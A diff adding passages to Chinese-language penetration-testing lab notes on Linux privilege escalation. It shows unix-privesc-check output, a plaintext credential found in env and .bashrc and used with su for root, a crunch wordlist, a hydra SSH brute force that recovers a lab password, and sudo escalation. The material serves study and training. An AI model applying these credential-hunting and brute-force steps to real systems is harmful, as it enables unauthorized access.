@@ -541,3 +541,185 @@ joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
 如果 /bin/cp（複製命令）是 SUID，我們可以複製並覆寫敏感文件，如 /etc/passwd。
 
 ### Automated Enumeration
+在 UNIX 衍生產品（例如 Linux）上使用 `unix-privesc-check`
+已預設安裝在 Kali 的：`/usr/bin/unix-privesc-check`
+```
+┌──(chw㉿CHW)-[/usr/bin]
+└─$ unix-privesc-check
+unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )
+
+Usage: unix-privesc-check { standard | detailed }
+
+"standard" mode: Speed-optimised check of lots of security settings.
+
+"detailed" mode: Same as standard mode, but also checks perms of open file
+                 handles and called files (e.g. parsed from shell scripts,
+                 linked .so files).  This mode is slow and prone to false 
+                 positives but might help you find more subtle flaws in 3rd
+                 party programs.
+
+This script checks file permissions and other settings that could allow
+local users to escalate privileges.
+
+Use of this script is only permitted on systems which you have been granted
+legal permission to perform a security assessment of.  Apart from this 
+condition the GPL v2 applies.
+
+Search the output for the word 'WARNING'.  If you don't see it then this
+script didn't find any problems.
+```
+> 支援 "standard" 和 "detailed" 模式
+> standard mode 似乎執行了速度優化的過程，並且應該可以減少誤報的數量
+
+腳本會對常見文件的權限執行大量檢查。例如，以下顯示非 root 使用者可寫入的設定檔：
+```
+┌──(chw㉿CHW)-[/usr/bin]
+└─$ ./unix-privesc-check standard 
+...
+Checking for writable config files
+############################################
+    Checking if anyone except root can change /etc/passwd
+WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
+    Checking if anyone except root can change /etc/group
+    Checking if anyone except root can change /etc/fstab
+    Checking if anyone except root can change /etc/profile
+    Checking if anyone except root can change /etc/sudoers
+    Checking if anyone except root can change /etc/shadow
+```
+
+## Exposed Confidential Information
+檢查 user 和 service history files 達到提權
+### Inspecting User Trails
+使用者的歷史文件通常包含明文使用者活動，其中可能包括密碼或其他驗證資料等敏感資訊。
+- [dotfiles](https://wiki.archlinux.org/title/Dotfiles): 應用程式通常會將使用者特定的設定檔案和子目錄儲存在使用者的主目錄下，這些檔案名稱前面會加上一個 dot（.）。
+`.bashrc` 是一個常見的 dotfile。當一個新的終端視窗在現有的登入會話中開啟，或者當從現有的登入會話啟動新的 shell 時，`.bashrc` 這個 bash 腳本會被執行。在這個腳本中，使用者可以設定環境變數，這些環境變數會在每次開啟新的 shell 實例時自動設置。
+#### 1. 查看 env
+```
+joe@debian-privesc:~$ env
+...
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+SCRIPT_CREDENTIALS=lab
+USER=joe
+LC_TERMINAL_VERSION=3.4.16
+SHLVL=1
+XDG_SESSION_ID=35
+LC_CTYPE=UTF-8
+XDG_RUNTIME_DIR=/run/user/1000
+SSH_CLIENT=192.168.118.2 59808 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+MAIL=/var/mail/joe
+SSH_TTY=/dev/pts/1
+OLDPWD=/home/joe/.cache
+_=/usr/bin/env
+```
+> 在 env 看到一個不尋常的環境變數: `SCRIPT_CREDENTIALS=lab`
+
+`SCRIPT_CREDENTIALS` 變數會保存一個類似密碼的值。為了確認我們正在處理永久變量，因此需要檢查`.bashrc`
+```
+joe@debian-privesc:~$ cat .bashrc
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+export SCRIPT_CREDENTIALS="lab"
+HISTCONTROL=ignoreboth
+...
+```
+> 從 `.bashrc` 中得知，當使用者的 shell 啟動時，保存密碼的變數會被匯出
+#### 2. 嘗試使用 .bashrc 資訊取得 root
+嘗試用密碼使用 root 權限
+```
+joe@debian-privesc:~$ su - root
+Password:
+
+root@debian-privesc:~# whoami
+root
+```
+> 成功取得 root
+
+接著換一種方式，取得在上述有發現的 user: eve
+#### crunch (custom wordlist)
+使用 crunch cmd工具產生自訂 wordlist。將最小長度和最大長度設為 6 個字元，使用 `-t` 參數指定模式，然後將前三個字符硬編碼為Lab ，後面跟著三個數字。
+```
+┌──(chw㉿CHW)-[~]
+└─$ crunch 6 6 -t Lab%%% > wordlist
+Crunch will now generate the following amount of data: 7000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 1000 
+                                       
+┌──(chw㉿CHW)-[~]
+└─$ cat wordlist                   
+Lab000
+Lab001
+Lab002
+Lab003
+Lab004
+Lab005
+Lab006
+...
+Lab999
+```
+#### 3. hydra 爆破 user password
+使用 hydra 爆破 ssh eve
+```
+┌──(chw㉿CHW)-[~]
+└─$ hydra -l eve -P wordlist  192.168.163.214 -t 4 ssh -V
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-25 04:21:16
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
+[DATA] attacking ssh://192.168.163.214:22/
+[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
+[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
+[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
+[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
+[ATTEMPT] target 192.168.163.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 0] (0/0)
+...
+[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
+1 of 1 target successfully completed, 1 valid password found
+```
+> eve/Lab123
+
+#### 4. SSH 登入 user，檢查權限
+```
+┌──(chw㉿CHW)-[~]
+└─$  ssh eve@192.168.50.214
+eve@192.168.50.214's password:
+Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
+...
+eve@debian-privesc:~$
+```
+使用 `sudo -l` 列出 sudo 功能來驗證是否能以特權使用者身分執行
+```
+eve@debian-privesc:~$ sudo -l
+[sudo] password for eve:
+Matching Defaults entries for eve on debian-privesc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+```
+> eve 是管理帳戶，可以以 elevated user 執行
+
+```
+eve@debian-privesc:~$ sudo -i
+[sudo] password for eve:
+
+root@debian-privesc:/home/eve# whoami
+root
+```
+
+### Inspecting Service Footprints
